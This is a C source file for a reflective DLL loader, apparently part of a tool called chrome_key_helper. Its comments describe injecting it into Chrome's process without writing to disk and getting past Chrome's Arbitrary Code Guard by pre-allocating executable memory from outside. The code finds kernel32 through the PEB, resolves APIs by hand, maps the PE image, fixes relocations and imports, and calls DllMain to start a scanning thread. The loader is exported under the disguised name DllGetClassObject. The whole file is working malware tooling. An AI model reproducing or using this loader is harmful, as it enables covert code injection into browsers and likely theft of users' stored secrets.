/*
 * ckh_reflect.c — minimal reflective loader for chrome_key_helper.dll
 *
 * Injected as raw PE bytes via VirtualAllocEx+WriteProcessMemory.
 * CreateRemoteThread calls ReflectiveLoader (not LoadLibraryA) — no disk drop.
 *
 * Key difference from standard reflect.c: sections copied from
 * PointerToRawData (file layout in raw blob) → VirtualAddress (mapped layout).
 */

#include <windows.h>
#include <stdint.h>

/* UNICODE_STRING — not always exposed without winternl.h */
#ifndef _UNICODE_STRING_DEFINED
#define _UNICODE_STRING_DEFINED
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
#endif

typedef HMODULE (WINAPI *_fLL_t)(LPCSTR);
typedef FARPROC (WINAPI *_fGP_t)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *_fVA_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *_fFI_t)(HANDLE, LPCVOID, SIZE_T);
typedef HANDLE  (WINAPI *_fCP_t)(void);
typedef BOOL    (WINAPI *_fDM_t)(HINSTANCE, DWORD, LPVOID);
typedef DWORD   (WINAPI *_fGCPID_t)(void);
typedef HANDLE  (WINAPI *_fOFM_t)(DWORD, BOOL, LPCSTR);
typedef LPVOID  (WINAPI *_fMVF_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL    (WINAPI *_fUMVF_t)(LPCVOID);
typedef BOOL    (WINAPI *_fCH_t)(HANDLE);

/* Minimal LDR_DATA_TABLE_ENTRY — offsets verified for x64 Win10/11 */
typedef struct {
    LIST_ENTRY      InLoadOrder;
    LIST_ENTRY      InMemoryOrder;
    LIST_ENTRY      InInitOrder;
    PVOID           DllBase;
    PVOID           EntryPoint;
    ULONG           SizeOfImage;
    ULONG           _pad;
    UNICODE_STRING  FullDllName;
    UNICODE_STRING  BaseDllName;
} _LDRE;

typedef struct {
    ULONG     Length;
    BOOLEAN   Initialized;
    PVOID     SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
} _PEBLDR;

typedef struct {
    BYTE    Reserved[2];
    BYTE    BeingDebugged;
    BYTE    Reserved2;
    PVOID   Reserved3[2];
    _PEBLDR *Ldr;
} _PEB;

static int _ceq(const char *a, const char *b) {
    while (*a && *b && ((*a)|0x20)==((*b)|0x20)) { a++; b++; }
    return *a==0 && *b==0;
}

static int _weqn(const WCHAR *w, const char *s, int n) {
    for (int i=0; i<n; i++) {
        if (!w[i] && !s[i]) return 1;
        if (!w[i] || !s[i]) return 0;
        if ((int)(w[i]|0x20) != (int)((unsigned char)s[i]|0x20)) return 0;
    }
    return 1;
}

/* Locate kernel32 via PEB InMemoryOrderModuleList.
 *
 * Use raw byte offsets — avoids struct alignment issues.
 * Verified offsets (x64, Win10/11 — Vergilius Project):
 *   InMemoryOrderLinks  +0x010  (c points here → base = c - 0x10)
 *   DllBase             +0x030
 *   BaseDllName.Length  +0x054  (USHORT)
 *   BaseDllName.Buffer  +0x05C  (PWSTR, UNICODE_STRING.Buffer is at +0x008
 *                                within the struct, +0x054+0x008 = +0x05C)
 *
 * The _LDRE struct kept as reference, but NOT used here:
 * its _pad field shifts BaseDllName to +0x058 (wrong), because the compiler
 * adds natural alignment padding that Windows's actual struct doesn't have.
 */
static ULONG_PTR _k32(void) {
#ifdef _WIN64
    _PEB *peb = (_PEB *)__readgsqword(0x60);
#else
    _PEB *peb = (_PEB *)__readfsdword(0x30);
#endif
    PLIST_ENTRY h = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY c = h->Flink;
    while (c != h) {
        uint8_t *e = (uint8_t *)c - 0x10;          /* entry base */
        USHORT   len = *(USHORT *)(e + 0x54);       /* BaseDllName.Length */
        if (len >= 24) {
            PWSTR buf = *(PWSTR *)(e + 0x5C);       /* BaseDllName.Buffer */
            if (_weqn(buf, "kernel32.dll", 12))
                return *(ULONG_PTR *)(e + 0x30);    /* DllBase */
        }
        c = c->Flink;
    }
    return 0;
}

/* Walk EAT of a loaded module (mapped layout) */
static ULONG_PTR _eat(ULONG_PTR m, const char *name) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)m;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(m + dos->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!rva) return 0;
    PIMAGE_EXPORT_DIRECTORY e = (PIMAGE_EXPORT_DIRECTORY)(m + rva);
    DWORD *ns = (DWORD *)(m + e->AddressOfNames);
    WORD  *os = (WORD  *)(m + e->AddressOfNameOrdinals);
    DWORD *fs = (DWORD *)(m + e->AddressOfFunctions);
    for (DWORD i = 0; i < e->NumberOfNames; i++)
        if (_ceq((char *)(m + ns[i]), name)) return m + fs[os[i]];
    return 0;
}

/*
 * Scan backward from own IP for MZ+NT signature.
 *
 * IMPORTANT: must NOT use &_own or any function-address expression.
 * On Windows/MinGW x86_64, taking a function's address generates an absolute
 * ImageBase-relative value (backed by a BASE64 relocation entry). When the DLL
 * runs from the raw file-layout blob (remote_blob, no relocations applied),
 * that value points to the wrong address range and the scan fails.
 *
 * Instead, read the actual runtime RIP via LEA — always position-independent.
 */
static __attribute__((noinline)) ULONG_PTR _own(void)
{
    ULONG_PTR ip;
#ifdef _WIN64
    __asm__ volatile ("leaq 0(%%rip), %0" : "=r"(ip));
#else
    __asm__ volatile ("call 1f\n1: popl %0" : "=r"(ip));
#endif
    ip &= ~0xFFFUL;
    for (int i = 0; i < 4096; i++, ip -= 0x1000) {
        if (*(WORD *)ip != IMAGE_DOS_SIGNATURE) continue;
        PIMAGE_DOS_HEADER d = (PIMAGE_DOS_HEADER)ip;
        if ((ULONG_PTR)d->e_lfanew >= 0x400) continue;
        PIMAGE_NT_HEADERS n = (PIMAGE_NT_HEADERS)(ip + d->e_lfanew);
        if (n->Signature == IMAGE_NT_SIGNATURE &&
            n->OptionalHeader.SizeOfImage > 0)
            return ip;
    }
    return 0;
}

/*
 * ReflectiveLoader — exported, called as CreateRemoteThread start routine.
 * Maps the raw PE blob into a new allocation, resolves imports, calls DllMain.
 */
__declspec(dllexport)
ULONG_PTR WINAPI DllGetClassObject(LPVOID lpParam)
{
    /*
     * lpParam = remote_img (pre-allocated, page-executable).
     * We write a 1-byte step counter to lpParam[1] at each milestone.
     * Injector reads this back with ReadProcessMemory after thread exit:
     *   0x01 = k32 lookup failed
     *   0x02 = LoadLibraryA/GetProcAddress/VirtualAlloc export not found
     *   0x03 = _own() failed (couldn't find MZ header scanning backward)
     *   0x5A = PE headers were copied (byte 1 of DOS = 'Z') → success path
     */
#define _RL_STEP(n) do { \
    if (lpParam) ((volatile uint8_t *)lpParam)[1] = (uint8_t)(n); \
} while(0)

    _RL_STEP(0x01);

    ULONG_PTR k = _k32();
    if (!k) return 0;

    _RL_STEP(0x02);

    _fLL_t fLL = (_fLL_t)_eat(k, "LoadLibraryA");
    _fGP_t fGP = (_fGP_t)_eat(k, "GetProcAddress");
    _fVA_t fVA = (_fVA_t)_eat(k, "VirtualAlloc");
    _fFI_t fFI = (_fFI_t)_eat(k, "FlushInstructionCache");
    _fCP_t fCP = (_fCP_t)_eat(k, "GetCurrentProcess");

    if (!fLL || !fGP || !fVA) return 0;

    _RL_STEP(0x03);

    /* locate raw PE blob (file layout) in remote process memory */
    ULONG_PTR src = _own();
    if (!src) return 0;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)src;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(src + dos->e_lfanew);
    DWORD imgSz = nt->OptionalHeader.SizeOfImage;
    DWORD hdrSz = nt->OptionalHeader.SizeOfHeaders;

    /*
     * Use caller-supplied base if provided (lpParam != NULL).
     * Caller pre-allocates from outside Chrome to bypass ACG which blocks
     * VirtualAlloc(PAGE_EXECUTE_*) from within the process itself.
     */
    ULONG_PTR dst;
    if (lpParam) {
        dst = (ULONG_PTR)lpParam;
    } else {
        dst = (ULONG_PTR)fVA(
            (LPVOID)nt->OptionalHeader.ImageBase, imgSz,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!dst)
            dst = (ULONG_PTR)fVA(NULL, imgSz,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!dst) return 0;
    }

    /* copy PE headers */
    for (DWORD i = 0; i < hdrSz; i++)
        ((uint8_t *)dst)[i] = ((uint8_t *)src)[i];

    /*
     * Copy sections: src is file layout → PointerToRawData.
     *                dst is mapped layout → VirtualAddress.
     */
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!sec->PointerToRawData || !sec->SizeOfRawData) continue;
        uint8_t *sS = (uint8_t *)(src + sec->PointerToRawData);
        uint8_t *sD = (uint8_t *)(dst + sec->VirtualAddress);
        for (DWORD j = 0; j < sec->SizeOfRawData; j++) sD[j] = sS[j];
    }

    PIMAGE_NT_HEADERS dstNt =
        (PIMAGE_NT_HEADERS)(dst + ((PIMAGE_DOS_HEADER)dst)->e_lfanew);

    /* base relocations */
    LONG_PTR delta = (LONG_PTR)(dst - nt->OptionalHeader.ImageBase);
    {
        DWORD rva = dstNt->OptionalHeader
            .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD sz  = dstNt->OptionalHeader
            .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        if (delta && rva && sz) {
            PIMAGE_BASE_RELOCATION r = (PIMAGE_BASE_RELOCATION)(dst + rva);
            while (r->VirtualAddress && r->SizeOfBlock) {
                ULONG_PTR pg  = dst + r->VirtualAddress;
                WORD     *ent = (WORD *)((uint8_t *)r + sizeof(IMAGE_BASE_RELOCATION));
                DWORD     cnt = (r->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                for (DWORD i = 0; i < cnt; i++) {
                    int   type = ent[i] >> 12;
                    DWORD off  = ent[i] & 0xFFF;
#ifdef _WIN64
                    if (type == IMAGE_REL_BASED_DIR64)
                        *(ULONG_PTR *)(pg + off) += (ULONG_PTR)delta;
#endif
                    if (type == IMAGE_REL_BASED_HIGHLOW)
                        *(DWORD *)(pg + off) += (DWORD)delta;
                }
                r = (PIMAGE_BASE_RELOCATION)((uint8_t *)r + r->SizeOfBlock);
            }
        }
    }

    /* resolve imports */
    {
        DWORD rva = dstNt->OptionalHeader
            .DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        if (rva) {
            PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(dst + rva);
            for (; imp->Name; imp++) {
                HMODULE hL = fLL((char *)(dst + imp->Name));
                if (!hL) continue;
                IMAGE_THUNK_DATA *iat = (IMAGE_THUNK_DATA *)(dst + imp->FirstThunk);
                IMAGE_THUNK_DATA *ont = imp->OriginalFirstThunk
                    ? (IMAGE_THUNK_DATA *)(dst + imp->OriginalFirstThunk) : iat;
                for (; ont->u1.AddressOfData; ont++, iat++) {
                    FARPROC pr;
                    if (IMAGE_SNAP_BY_ORDINAL(ont->u1.Ordinal))
                        pr = fGP(hL, (LPCSTR)IMAGE_ORDINAL(ont->u1.Ordinal));
                    else {
                        PIMAGE_IMPORT_BY_NAME ibn =
                            (PIMAGE_IMPORT_BY_NAME)(dst + (DWORD)ont->u1.AddressOfData);
                        pr = fGP(hL, (LPCSTR)ibn->Name);
                    }
                    iat->u1.Function = (ULONG_PTR)pr;
                }
            }
        }
    }

    /* flush icache */
    if (fFI && fCP) fFI(fCP(), (LPVOID)dst, imgSz);

    /* call DllMain(DLL_PROCESS_ATTACH) → creates _scan_thread */
    _fDM_t fDM = (_fDM_t)(dst + dstNt->OptionalHeader.AddressOfEntryPoint);
    fDM((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);

    return dst;
}
